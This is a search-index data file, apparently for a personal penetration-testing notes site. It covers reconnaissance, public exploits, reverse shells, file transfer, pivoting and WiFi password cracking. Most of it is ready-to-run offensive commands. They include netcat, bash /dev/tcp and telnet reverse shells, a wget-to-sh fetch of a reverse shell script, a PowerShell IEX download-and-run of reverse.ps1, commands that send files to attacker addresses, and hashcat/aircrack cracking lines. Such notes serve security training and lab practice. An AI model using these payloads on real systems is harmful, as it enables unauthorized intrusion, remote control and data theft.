load_search_index({"pages":[{"title":"Cybersecurity Note","text":"","tags":"","url":"index.html"},{"title":"Reconnaissance","text":"Reconnaissance tags: Security Recon Table of Contents Reconnaissance tags: Security Recon Reference Workflow Tools Passive Information Gathering Search Engine Google hacking Asset identification Email Harvesting Tools Active Information Gathering DNS enumeration Port Scanning Scan for UDP Fingerprint Scanning Vulnerability Scanning AWS S3 buckets Reference Workflow Recon workflow cheatsheets Tools OWASP Amass: DNS Scraping Certificates APIs Web Archives Passive Information Gathering Search Engine Google hacking Google hacking database Asset identification Shodan Censys Email Harvesting theHarvester: Gathers emails, names, subdomains, IPs, and URLs theharvester -d cisco.com -b google Tools recon-ng whois Sublist3r: Fast subdomains enumeration tool Active Information Gathering @|\u2b50\u6383\u63cf cheat sheet|Hakluke\u2019s Ultimate OSCP Guide DNS enumeration tools - DNSRecon example: brute force reverse zone dnsrecon -n 10.10.10.83 -r 10.0.0.0\/8 --db olympus.db dnsrecon -n 10.10.10.83 -r 172.16.0.0\/12 --db olympus.db dnsrecon -n 10.10.10.83 -r 192.168.0.0\/16 --db olympus.db brute force subdomain tools - knock reverse lookup brute force - \u53cd\u67e5 ip A zone transfer can be requested by specifying a type of AXFR dig axfr @10.10.10.83 olympus.htb DNS Zone Transfer - \u507d\u88dd\u6210 slave DNS # get dns server list host -t ns megacorpone.com | cut -d &quot; &quot; -f 4 # require DNS zone host -l {{domain name}} {{dns server address}} host -l megacorpone.com ns2.megacorpone.com #!\/bin\/bash # Simple Zone Transfer Bash Script # $1 is the first argument given after the bash script # Check if argument was given, if not, print usage if [ -z &quot;$1&quot; ]; then echo &quot;[*] Simple Zone transfer script&quot; echo &quot;[*] Usage : $0 &lt;domain name&gt; &quot; exit 0 fi # if argument was given, identify the DNS servers for the domain for server in $(host -t ns $1 |cut -d&quot; &quot; -f4);do # For each of these servers, attempt a zone transfer host -l $1 $server |grep &quot;has address&quot; done Port Scanning TCP \u958b\u555f\uff0c\u56de\u8986 SYN-ACK \u5c01\u5305 UDP \u9001\u51fa\u7a7a\u7684 UDP \u5305 \u958b\u555f\uff0c\u6c92\u6709\u56de\u8986 \u95dc\u9589\uff0c\u56de\u8986 ICMP unreachable SNMP - onesixtyone Tools nmap Masccan Scan for UDP nmap -sU 10.11.1.X unicornscan -mU -v -I 10.11.1.X Fingerprint Scanning lbd - Load balancer detector Netcraft [website] Vulnerability Scanning Nmap OpenVAS (Nessus) AWS S3 buckets \u679a\u8209 Bucket Name S3Scanner grayhatwarfare: Public buckets by grayhatwarfare","tags":"","url":"Pentest_Misc_Knowledge\/Reconnaissance.html"},{"title":"Using Public Exploits","text":"Using Public Exploits tags: Security Table of Contents Using Public Exploits tags: Security Searching Exploits Exploit Explanation Using Exploit Tools searchsploit Searching Exploits Exploit Database SecurityFocus Exploit Explanation comics explanation - xkcd Google: heartbleed xkcd Using Exploit for i in $(seq 0 100); do python heartbleed.py valentine.htb; done Tools searchsploit searchsploit -o windows smb -o, --overflow [Term] Exploit titles are allowed to overflow their columns. searchsploit -m 17491 -m, --mirror [EDB-ID] Mirror (aka copies) an exploit to the current working directory.","tags":"","url":"Pentest_Misc_Knowledge\/Using_Public_Exploits.html"},{"title":"Reverse Shell","text":"Reverse Shell tags: Security ReverseShell :::info Table of Contents Reverse Shell tags: Security ReverseShell Move Payload to Target Download from HTTPS Server Spawn Reverse Shell Online Resource Cheat Sheet netcat (really reliable) with ssl bash mknod telnet php powershell Spwning fully interactive TTY Shell Online Resource Overview Steps Cheat Sheet Python perl ruby lua From within IRB From within vi From within nmap Other Tips rlwrap Getting Xterm shell ::: Move Payload to Target Download from HTTPS Server wget --no-check-certificate wildfoo.tw\/reverse_shell -O \/tmp\/s sh \/tmp\/s Spawn Reverse Shell Online Resource 7 linux shells using built in tools Pentestmonkey - Reverse Shell Cheat Sheet Cheat Sheet netcat (really reliable) rm \/tmp\/f;mkfifo \/tmp\/f;cat \/tmp\/f|\/bin\/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;\/tmp\/f ncat -lk -n -v 7777 with ssl Target: ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl Attacker: ncat -v 10.0.0.22 4444 --ssl bash bash -i &gt;&amp; \/dev\/tcp\/127.0.0.1\/8787 0&gt;&amp;1 exec 5&lt;&gt;\/dev\/tcp\/127.0.0.1\/8787; cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done mknod if GAPING_SECURITY_HOLE = disabled mknod backpipe p &amp;&amp; nc 10.10.14.207 7777 0&lt;backpipe | \/bin\/bash 1&gt;backpipe telnet mknod backpipe p &amp;&amp; telnet 10.10.14.207 7777 0&lt;backpipe | \/bin\/bash php \/usr\/share\/laudanum\/php\/php-reverse-shell.php powershell nishang\/Shells cp \/usr\/share\/nishang\/Shells\/Invoke-PowerShellTcp.ps1 reverse.ps1 vim reverse.ps1 : copy : .EXAMPLE : PS &gt; Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444 : to end of file and edit ip and port and delete 'PS &gt; ' python3 -m http.server 80 powershell IEX(New-Object Net.WebClient).downloadstring(&quot;http:\/\/10.10.14.42\/reverse.ps1&quot;) sometimes we need use \\&quot; to escape Spwning fully interactive TTY Shell Online Resource NETSEC - Spawning TTY Shell cheat sheet Overview \u901a\u5e38\u62ff\u5230\u7684 reverse shell \u6703\u6709\u4e00\u4e9b\u554f\u984c Some commands, like su and ssh require a proper terminal to run STDERR usually isn\u2019t displayed Can\u2019t properly use text editors like vim No tab-complete No up arrow history No job control Upgrading simple shells to fully interactive TTYs Steps use bash ncat -lk -n -v 7777 and get shell type python -c 'import pty; pty.spawn(&quot;\/bin\/bash&quot;)' in reverse shell Ctrl-Z type stty raw -echo fg &lt;enter&gt; &lt;enter&gt; export TERM=xterm allow us use Ctrl-l to clean the screen Cheat Sheet Python python -c 'import pty; pty.spawn(&quot;\/bin\/sh&quot;)' echo os.system('\/bin\/bash') \/bin\/sh -i perl perl -e 'exec &quot;\/bin\/sh&quot;;' exec &quot;\/bin\/sh&quot;; ruby exec &quot;\/bin\/sh&quot; lua os.execute('\/bin\/sh') From within IRB exec &quot;\/bin\/sh&quot; From within vi :!bash :set shell=\/bin\/bash:shell From within nmap !sh Other Tips rlwrap Getting Xterm shell Make sure your Xserver is listening to TCP: $ netstat -lntup Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID tcp 0 0 0.0.0.0:6000 0.0.0.0:* LISTEN - tcp6 0 0 :::6000 :::* LISTEN - New Xserver versions have tcp listening disabled by default. Consult your distro how to enable it. You may have to change your display manager settings or the xserverrc file, e.g.: $ cat \/etc\/X11\/xinit\/xserverrc #!\/bin\/sh if [ -z &quot;$XDG_VTNR&quot; ]; then exec \/usr\/bin\/X -listen tcp &quot;$@&quot; else exec \/usr\/bin\/X -listen tcp &quot;$@&quot; vt$XDG_VTNR fi Then all you have to do is to allow incoming connections from the specific IP: $ xhost +10.10.10.69 Now let\u2019s connect: \/usr\/bin\/xterm -display 10.10.15.203:0 or DISPLAY=10.10.15.203:0 \/usr\/bin\/xterm","tags":"","url":"Pentest_Misc_Knowledge\/Reverse_Shell.html"},{"title":"File Transfer","text":"File Transfers tags: Security Table of Contents File Transfers tags: Security Reference Unix netcat http - put python3 http.server nginx Powershell Invoke-WebRuquest upoad - with put method download run sciprt Reference offsecnewbie Unix netcat Receiver ncat -l -n -v 90 &gt; simpler.py Sender cat simpler.py | nc 10.10.14.207 90 Ctrl-c http - put python3 http.server Sender: upload - with put method curl --upload-file TEST.txt --url http:\/\/192.168.8.9\/TEST.txt --http1.0 Receiver: http.server with put method wget https:\/\/github.com\/WildfootW\/Security-utility-Scripts\/blob\/master\/Network_Protocol\/http.server_with-put.py python3 http.server_with-put.py 80 nginx Receiver server { listen 8001 default_server; server_name wildfootw; location \/ { root \/var\/www\/upload; dav_methods PUT; } } Sender curl --upload-file captured.cap 10.10.14.14:8001 Powershell SANS blog Invoke-WebRuquest upoad - with put method $FilePath = &quot;.\\TEST.txt&quot; $uri = &quot;http:\/\/192.168.8.9\/TEST.txt&quot; Invoke-WebRequest -uri $uri -Method Put -Infile $FilePath -ContentType 'text\/plain' download Invoke-WebRequest -Uri &quot;http:\/\/10.10.14.42\/wmic_info.bat&quot; -OutFile wmic_info.bat run sciprt powershell IEX(New-Object Net.WebClient).downloadstring(&quot;http:\/\/10.10.14.42\/reverse.ps1&quot;) maybe you need use \\&quot; to escape","tags":"","url":"Pentest_Misc_Knowledge\/File_Transfer.html"},{"title":"Pivoting (Port Fun)","text":"Pivoting (Port Fun) tags: Security Pivoting Table of Contents Pivoting (Port Fun) tags: Security Pivoting Reference Example nc &lt;== telnet \/bin\/bash telnet ==&gt; nc A:9000 &lt;== ssh ==&gt; C:80 local:1080 socks5 &lt;== ssh 10.10.10.75 ==&gt; any temp Reference NETSEC - Dynamic Port Forwarding(SSH) HighOn.Coffee - SSH &amp; Meterpreter Pivoting Techique Example nc &lt;== telnet \/bin\/bash telnet ==&gt; nc Machine A: nc -lk -n -v 7777 Machine B: telnet A.A.A.A 7777 | \/bin\/bash | telnet B.B.B.B 7777 Machine C: nc -lk -n -v 7777 A:9000 &lt;== ssh ==&gt; C:80 Machine A: ssh -i ~\/.ssh\/B.root.key -L9000:C.C.C.C:80 B.B.B.B or ssh B.B.B.B &lt;enter&gt; &lt;enter&gt; ~C ssh&gt; -L 9000:C.C.C.C:80 local:1080 socks5 &lt;== ssh 10.10.10.75 ==&gt; any ssh -D1080 10.10.10.75 netstat -alnp | grep LIST | grep 1080 vim \/etc\/proxychains.conf : [ProxyList] : # add proxy here ... : # meanwile : # defaults set to &quot;tor&quot; : #socks4 127.0.0.1 9050 : # metasploit : #socks4 127.0.0.1 1080 : # ssh : socks5 127.0.0.1 1080 proxychains curl -k https:\/\/10.10.10.60 temp Note: FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP] FPipe.exe -l 80 -r 80 -s 80 192.168.1.7 Note: ssh -[L\/R] [local port]:[remote ip]:[remote port] [local user]@[local ip] ssh -L 8080:127.0.0.1:80 root@192.168.1.7 # Local Port ssh -R 8080:127.0.0.1:80 root@192.168.1.7 # Remote Port Note: mknod backpipe p ; nc -l -p [remote port] &lt; backpipe | nc [local IP] [local port] &gt;backpipe mknod backpipe p ; nc -l -p 8080 &lt; backpipe | nc 10.5.5.151 80 &gt;backpipe # Port Relay mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1&gt;backpipe # Proxy (Port 80 to 8080) mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow &amp; 1&gt;backpipe # Proxy monitor (Port 80 to 8080) Is tunnelling possible? Send commands locally, remotely ssh -D 127.0.0.1:9050 -N [username]@[ip] proxychains ifconfig","tags":"","url":"Pentest_Misc_Knowledge\/Pivoting_(Port_Fun).html"},{"title":"Wireless Secuirty","text":"Wireless Security tags: Security Wireless WiFi :::info Table of Contents Wireless Security tags: Security Wireless WiFi Cracking CAP file Using Aircrack-ng Using hashcat Decrypt CAP ::: Cracking CAP file Using Aircrack-ng aircrack-ng captured.cap -w rockyou.txt Using hashcat git clone https:\/\/github.com\/hashcat\/hashcat-utils make .\/cap2hccapx.bin captured.cap captured.hccapx .\/hashcat -m 2500 hashes\/captured.hccapx \/opt\/wordlist\/rockyou.txt Decrypt CAP Wireshark - Preferences - IEEE 802.11 - Decryption Keys - +","tags":"","url":"Pentest_Misc_Knowledge\/Wireless_Secuirty.html"}]});